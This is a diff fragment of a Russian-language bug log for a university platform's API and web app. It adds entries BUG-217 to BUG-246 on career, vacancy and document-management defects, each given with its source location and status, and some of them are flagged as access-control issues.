+#### BUG-217 · 🟢 Строки «Карьерных мероприятий» не открываются — записаться из раздела нельзя
+- **Где:** `apps/web/src/views/career/ui/career-events-view.tsx:159-209`, `career-view.tsx:715-753` · **Статус:** новый
+
+#### BUG-218 · 🟢 API позволяет править закрытую вакансию и возвращает её на модерацию
+- **Где:** `apps/api/src/modules/career/vacancies.service.ts:147-184` · **Статус:** новый
+
+#### BUG-219 · 🟢 Фильтр `salaryFrom` отбрасывает вакансии «от N» без верхней границы
+- **Где:** `apps/api/src/modules/career/vacancies.service.ts:280` · **Статус:** новый
+
+#### BUG-220 · 🟢 Просмотры вакансии считают сотрудников вуза и платформы
+- **Где:** `apps/api/src/modules/career/vacancies.service.ts:341-342`, `career-analytics.service.ts:369` · **Статус:** новый
+
+#### BUG-221 · 🟢 🔒 Карточка заблокированного студента по-прежнему отдаётся работодателю
+- **Где:** `apps/api/src/modules/career/career-profile.service.ts:292-296` (только `deletedAt: null`) · **Статус:** новый
+
+#### BUG-222 · 🟢 🔒 Карточка кандидата различает «чужой вуз» и «нет такого» — оракул существования id
+- **Где:** `apps/api/src/modules/career/career-profile.service.ts:176-185` (тот же класс, что BUG-066) · **Статус:** новый
+
+### Документы
+
+#### BUG-223 · 🟡 За 30 дней до срока крон снимает с сертификата «Подтверждён» — он пропадает из резюме
+- **Роль:** STUDENT, EMPLOYER · **Статус:** новый
+- **Где:** `apps/api/src/modules/documents/documents.service.ts:1566-1581`, `document-requests.service.ts:107`, `apps/api/src/modules/career/resume.service.ts:205`, `career-profile.service.ts:334`
+- **Ожидается:** §3.8 — «`VERIFIED` уступает только `NEEDS_REPLACEMENT` и правке».
+
+#### BUG-224 · 🟡 Проверка после закрытия запроса: документ становится «Загружен», студента просят заменить, но сделать это нельзя
+- **Где:** `apps/api/src/modules/documents/document-requests.service.ts:595-624,794,869,1001`, `documents.service.ts:162-176` · **Статус:** новый
+
+#### BUG-225 · 🟡 Удалённый документ остаётся в позиции комплекта: обязательная позиция «заполнена», сохранение черновика падает
+- **Где:** `apps/api/src/modules/documents/documents.service.ts:1419-1423`, `document-requests.service.ts:1016,1067,1146-1153,1266-1274` · **Статус:** новый
+
+#### BUG-226 · 🟡 Документ без файлов создаётся «Загружен», плитка «Нужно загрузить» всегда 0, пустой документ уходит в запрос
+- **Где:** `apps/web/src/views/documents/ui/upload-wizard.tsx:93-112`, `apps/api/src/modules/documents/documents.service.ts:685-688,1126`, `overview-panel.tsx:67`, `document-requests.service.ts:1144-1169` · **Статус:** новый
+
+#### BUG-227 · 🟡 Персональный доступ `USER` нельзя выдать ни из одного клиента
+- **Где:** `apps/web/src/views/documents/ui/document-actions.tsx:357,451-458` (только UNIVERSITY и DEPARTMENT); в iOS и Android выдачи доступа нет · **Статус:** новый
+- **Ожидается:** §3.8 — студенты и преподаватели открывают документ грантом USER.
+
+#### BUG-228 · 🟡 «Открытые мне»: получатель открывает только первую страницу документа
+- **Где:** `apps/web/src/views/documents/ui/shared-with-me.tsx:70-84,174-183`, `entities/document/ui/document-file-viewer.tsx:57`, `document-actions.tsx:197-205` · **Статус:** новый
+
+#### BUG-229 · 🟡 🔒 Журнал документа: каждое открытие пишется дважды, просмотр и скачивание перепутаны
+- **Где:** `apps/web/src/entities/document/ui/document-file-viewer.tsx:42`, `apps/api/src/modules/documents/documents.service.ts:860-866`, `apps/web/src/views/documents/ui/staff-requests.tsx:792` · **Статус:** новый
+- **Ожидается:** §3.8 — одна запись на действие, скачивание отличимо от просмотра.
+
+#### BUG-230 · 🟡 🔒 «Доступ» и «Управление доступом» учитывают отозванные и истёкшие гранты
+- **Где:** `apps/api/src/modules/documents/documents.service.ts:85,592,1272`, `apps/web/src/views/documents/ui/documents-list.tsx`, `document-actions.tsx:439` · **Статус:** новый
+
+#### BUG-231 · 🟡 Собственный тип документа удаляется одним кликом без подтверждения и без проверки использования
+- **Где:** `apps/web/src/views/document-types/ui/document-types-admin-view.tsx:247-254`, `apps/api/src/modules/documents/document-types.service.ts:200-211` · **Статус:** новый
+
+#### BUG-232 · 🟢 🔒 Проверяющий открывает черновик комплекта и его файлы до отправки (корень BUG-054)
+- **Где:** `apps/api/src/modules/documents/document-requests.service.ts:628-662,704-747` · **Статус:** новый
+
+#### BUG-233 · 🟢 Нет общего потолка в 30 страниц: после 30-й ломаются порядок, удаление и показ получателю
+- **Где:** `apps/api/src/modules/documents/documents.service.ts:654-689,770-777,815-823,957-961` · **Статус:** новый
+
+#### BUG-234 · 🟢 Продление срока не снимает «Скоро истекает»/«Просрочен», а веб не даёт менять даты и номер
+- **Где:** `apps/api/src/modules/documents/documents.service.ts:198-217,1207-1244`, `apps/web/src/views/documents/ui/document-actions.tsx:253-264`; повторное напоминание глушит `dedupeKey` (корень BUG-090) · **Статус:** новый
+
+#### BUG-235 · 🟢 Плитки «Обзора» документов считают одно, а открывают список с другим фильтром
+- **Где:** `apps/api/src/modules/documents/documents.service.ts:1455-1463`, `apps/web/src/views/documents/ui/overview-panel.tsx:83,91` · **Статус:** новый
+
+#### BUG-236 · 🟢 Возврат из архива в истории и журнале выглядит как «Архивирование»
+- **Где:** `apps/api/src/modules/documents/documents.service.ts:1382`, `document-actions.tsx:326`, `document-journal-view.tsx` · **Статус:** новый
+
+#### BUG-237 · 🟢 🔒 История документа у владельца не показывает, кто и через что его открыл
+- **Где:** `apps/web/src/views/documents/ui/document-actions.tsx:310-341`, `apps/api/src/modules/documents/documents.service.ts:1426-1433` · **Статус:** новый
+
+#### BUG-238 · 🟢 Отзыв справки не пишется в журнал документа
+- **Где:** `apps/api/src/modules/application-services/application-process.service.ts:376-384` · **Статус:** новый
+
+#### BUG-239 · 🟢 Грант с уже прошедшим сроком принимается, получателю уходит уведомление
+- **Где:** `packages/shared-schemas/src/documents.ts` (`GrantDocumentAccessSchema.expiresAt`), `apps/api/src/modules/documents/documents.service.ts:993-1012` · **Статус:** новый
+
+#### BUG-240 · 🟢 Запрос документов со сроком в прошлом создаётся и рассылается адресатам
+- **Где:** `CreateDocumentRequestSchema.dueAt`, `apps/api/src/modules/documents/document-requests.service.ts:413-461`, `apps/web/src/views/documents/ui/staff-requests.tsx:378-385` · **Статус:** новый
+
+#### BUG-241 · 🟢 Повторная отправка возвращённого комплекта сбрасывает уже принятые позиции
+- **Где:** `apps/api/src/modules/documents/document-requests.service.ts:1275-1279` · **Статус:** новый
+
+#### BUG-242 · 🟢 Комплект без единой приложенной позиции навсегда «Частично»
+- **Где:** `apps/api/src/modules/documents/document-requests.service.ts:851-854` · **Статус:** новый
+
+#### BUG-243 · 🟢 Поиск по ФИО в журнале документов молча ограничен 200 людьми
+- **Где:** `apps/api/src/modules/documents/document-journal.service.ts:166-181` · **Статус:** новый
+
+#### BUG-244 · 🟢 Поле «Срок хранения» после сброса типа показывает старое значение и пишет его снова
+- **Где:** `apps/web/src/views/document-types/ui/document-types-admin-view.tsx:172` · **Статус:** новый
+
+#### BUG-245 · 🟢 Собственный тип вуза в «Открытых мне» показывается кодом
+- **Где:** `apps/web/src/views/documents/ui/shared-with-me.tsx:66-67` · **Статус:** новый
+
+#### BUG-246 · 🟢 Уведомления «Новый запрос» и «Результат проверки» ведут на «Обзор», а не на запросы
+- **Где:** `apps/api/src/modules/documents/document-requests.service.ts:215,883` (`url: '/documents'` вместо `?section=requests`) · **Статус:** новый
+
+<!-- P3-END -->
+
 ## Замечено попутно
 
 Не баги в строгом смысле — поведение не описано или данные не используются, но стоит решить:
